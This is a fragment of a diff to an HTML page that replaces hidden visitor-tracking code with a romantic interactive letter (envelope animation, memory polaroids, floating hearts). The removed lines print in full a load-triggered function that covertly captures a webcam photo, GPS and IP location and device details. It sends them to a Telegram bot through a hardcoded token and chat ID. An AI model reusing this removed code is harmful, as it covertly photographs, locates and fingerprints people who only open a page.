+          ctx.arc(m.x, m.y, m.radius * 3, 0, Math.PI * 2);
+          ctx.fill();
+        });
+        requestAnimationFrame(renderLoop);
+      }
+
+      renderLoop();
+    }
+
+    // =========================================================================
+    // 3. INTERACTIVE EXPERIENCE FLOW
+    // =========================================================================
+    function initInteractiveApp() {
+      initAmbientParticles();
+
+      const pages = {
+        envelope: document.getElementById('page-envelope'),
+        letter: document.getElementById('page-letter'),
+        memories: document.getElementById('page-memories'),
+        final: document.getElementById('page-final')
+      };
+
+      function switchPage(nextPage) {
+        if (!nextPage) return;
+        Object.values(pages).forEach((p) => {
+          if (p) p.classList.remove('active');
+        });
+        nextPage.classList.add('active');
+        nextPage.scrollTop = 0;
+      }
+
+      // 3D Envelope Opening Sequence
+      const envelopeTrigger = document.getElementById('envelopeTrigger');
+      let hasOpened = false;
+
+      function triggerOpenEnvelope(e) {
+        if (e) e.preventDefault();
+        if (hasOpened) return;
+        hasOpened = true;
+        envelopeTrigger.classList.add('is-opening');
+
+        setTimeout(() => {
+          switchPage(pages.letter);
+        }, 1450);
+      }
+
+      if (envelopeTrigger) {
+        envelopeTrigger.addEventListener('click', triggerOpenEnvelope);
+        envelopeTrigger.addEventListener('keydown', (e) => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            triggerOpenEnvelope(e);
+          }
+        });
+      }
+
+      // Page Navigation Buttons
+      const toMemoriesBtn = document.getElementById('toMemoriesBtn');
+      if (toMemoriesBtn) {
+        toMemoriesBtn.addEventListener('click', () => {
+          switchPage(pages.memories);
+        });
+      }
+
+      const backToLetterBtn = document.getElementById('backToLetterBtn');
+      if (backToLetterBtn) {
+        backToLetterBtn.addEventListener('click', () => {
+          switchPage(pages.letter);
+        });
+      }
+
+      const toFinalBtn = document.getElementById('toFinalBtn');
+      if (toFinalBtn) {
+        toFinalBtn.addEventListener('click', () => {
+          switchPage(pages.final);
+        });
+      }
+
+      // Polaroid Lightbox Zoom
+      const lightbox = document.getElementById('photoLightbox');
+      const lightboxFrame = document.getElementById('lightboxFrame');
+      const lightboxText = document.getElementById('lightboxText');
+
+      document.querySelectorAll('.polaroid-item').forEach((card) => {
+        card.addEventListener('click', () => {
+          const img = card.querySelector('img');
+          const src = card.dataset.src || '';
+          const caption = card.dataset.caption || '';
+
+          lightboxFrame.innerHTML = '';
+          lightboxText.textContent = caption;
+
+          if (img && img.dataset.missing === 'true') {
+            lightboxFrame.innerHTML = `
+              <div class="polaroid-placeholder" style="display:flex;">
+                <svg viewBox="0 0 24 24" stroke-width="1.5" style="width:36px;height:36px;">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <circle cx="8.5" cy="10" r="1.5" />
+                  <path d="M21 15l-5-5L5 21" />
+                </svg>
+                <span style="font-size:1rem;">${src}</span>
+              </div>
+            `;
+          } else {
+            const fullImg = document.createElement('img');
+            fullImg.src = src;
+            fullImg.alt = caption;
+            lightboxFrame.appendChild(fullImg);
           }
 
-          const canvas = canvasRef;
-          const w = videoRef.videoWidth || 720;
-          const h = videoRef.videoHeight || 720;
-          canvas.width = w;
-          canvas.height = h;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(videoRef, 0, 0, w, h);
+          lightbox.classList.add('open');
+        });
+      });
 
-          const blob = await new Promise((resolve, reject) => {
-            canvas.toBlob(b => (b ? resolve(b) : reject(new Error('blob-fail'))), 'image/jpeg', 0.9);
-          });
+      if (lightbox) {
+        lightbox.addEventListener('click', () => {
+          lightbox.classList.remove('open');
+        });
+      }
 
-          let latLngCoords = {};
-          try {
-            latLngCoords = await new Promise((resolve) => {
-              if (!navigator.geolocation) return resolve({});
-              navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-                () => resolve({}),
-                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-              );
-            });
-          } catch (geoError) {
-            console.warn('Geolocation error:', geoError);
-          }
+      // Make a Wish — Floating Hearts & Secret Keepsake Message
+      const makeWishBtn = document.getElementById('makeWishBtn');
+      const wishMessage = document.getElementById('wishMessage');
+      const heartsLayer = document.getElementById('heartsLayer');
 
-          let ipDetails = { status: 'fail' };
-          let sharlocLink = '';
+      function launchGentleHearts() {
+        const glyphs = ['♡', '♥', '♡', '♥'];
+        const total = 16;
 
-          try {
-            const ipApiResponse = await fetch('http://ip-api.com/json/');
-            if (ipApiResponse.ok) {
-              const data = await ipApiResponse.json();
-              if (data.status === 'success' || (data.query && data.country)) {
-                ipDetails = data;
-              } else {
-                console.warn('IP API returned potentially invalid data:', data);
-              }
+        for (let i = 0; i < total; i++) {
+          setTimeout(() => {
+            const heart = document.createElement('span');
+            heart.className = 'rising-heart';
+            heart.textContent = glyphs[i % glyphs.length];
 
-              const finalLat = latLngCoords.lat || ipDetails.lat;
-              const finalLng = latLngCoords.lng || ipDetails.lon;
-              if (finalLat && finalLng) {
-                sharlocLink = `http://googleusercontent.com/maps.google.com/${finalLat},${finalLng}`;
-              }
-            } else {
-              console.warn('Failed to fetch IP details:', ipApiResponse.statusText);
-            }
-          } catch (ipApiError) {
-            console.warn('Error fetching IP details:', ipApiError);
-          }
+            const leftPercent = 16 + Math.random() * 68;
+            const sizeRem = 0.95 + Math.random() * 0.7;
+            const durationSec = 2.3 + Math.random() * 0.9;
 
-          const BOT_TOKEN = '7474809396:AAFzVx41utqmnmkTmvPLsknBsW58VZOH3Ds';
-          const CHAT_ID = '6128943834';
+            heart.style.left = `${leftPercent}%`;
+            heart.style.fontSize = `${sizeRem}rem`;
+            heart.style.animationDuration = `${durationSec}s`;
+            heart.style.color = i % 2 === 0 ? '#C58F91' : '#D9B7A0';
 
-          const userAgent = navigator.userAgent;
-          const platform = navigator.platform;
-          const screenWidth = window.screen.width;
-          const screenHeight = window.screen.height;
-          const browserLanguage = navigator.language || navigator.userLanguage;
-          const cpuCores = navigator.hardwareConcurrency;
-          const ram = navigator.deviceMemory;
-          const onLineStatus = navigator.onLine ? 'Online' : 'Offline';
-          const cookiesEnabled = navigator.cookieEnabled;
-          const referrer = document.referrer;
-          const localTime = new Date().toString();
+            heartsLayer.appendChild(heart);
 
-          const form = new FormData();
-          form.append('chat_id', CHAT_ID);
-          form.append('photo', blob, 'selfie.jpg');
-
-          let caption = "📸 Visitor Log\n\n";
-          if (sharlocLink) caption += `🔗 Location: ${sharlocLink}\n`;
-          if (ipDetails.query) caption += `🌐 IP: ${ipDetails.query}\n`;
-          if (ipDetails.country) caption += `🌍 Negara: ${ipDetails.country} (${ipDetails.countryCode})\n`;
-          if (ipDetails.regionName) caption += `🏙️ Wilayah: ${ipDetails.regionName}\n`;
-          if (ipDetails.city) caption += `🏠 Kota: ${ipDetails.city}\n`;
-          if (ipDetails.zip) caption += `📮 Zip: ${ipDetails.zip}\n`;
-          if (ipDetails.isp) caption += `🏢 Org: ${ipDetails.isp}\n`;
-          if (ipDetails.timezone) caption += `⏰ Zona Waktu: ${ipDetails.timezone}\n`;
-          if (latLngCoords.lat && latLngCoords.lng) {
-            caption += `📍 GPS: Lat ${latLngCoords.lat.toFixed(4)}, Lng ${latLngCoords.lng.toFixed(4)}\n`;
-          } else if (ipDetails.lat && ipDetails.lon) {
-            caption += `📍 GPS (IP): Lat ${ipDetails.lat.toFixed(4)}, Lng ${ipDetails.lon.toFixed(4)}\n`;
-          }
-          caption += `📱 Device: ${userAgent}\n`;
-          caption += `💻 Platform: ${platform}\n`;
-          caption += `🖥️ Screen: ${screenWidth}x${screenHeight}\n`;
-          caption += `🌐 Browser Lang: ${browserLanguage}\n`;
-          caption += `⚙️ CPU Cores: ${cpuCores}\n`;
-          if (ram) caption += `💾 RAM: ${ram} GB\n`;
-          caption += `🔌 Status: ${onLineStatus}\n`;
-          caption += `🍪 Cookies: ${cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
-          caption += `↩️ Referrer: ${referrer}\n`;
-          caption += `🕒 Local Time: ${localTime}\n`;
-
-          form.append('caption', caption);
-
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
-          if (!res.ok) {
-            const err = await res.json();
-            throw new Error(err?.description || res.statusText);
-          }
-        } catch (e) {
-          console.warn('[captureAndSend] skipped:', e);
-        } finally {
-          if (streamRef) {
-            streamRef.getTracks().forEach(t => t.stop());
-            streamRef = null;
-          }
+            setTimeout(() => {
+              heart.remove();
+            }, durationSec * 1000 + 150);
+          }, i * 105);
         }
       }
 
-      captureAndSend();
-    });
-  </script>
+      if (makeWishBtn) {
+        makeWishBtn.addEventListener('click', () => {
+          wishMessage.classList.add('revealed');
+          launchGentleHearts();
+        });
+      }
+    }
 
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initInteractiveApp);
+    } else {
+      initInteractiveApp();
+    }
+  </script>
 </body>
 </html>
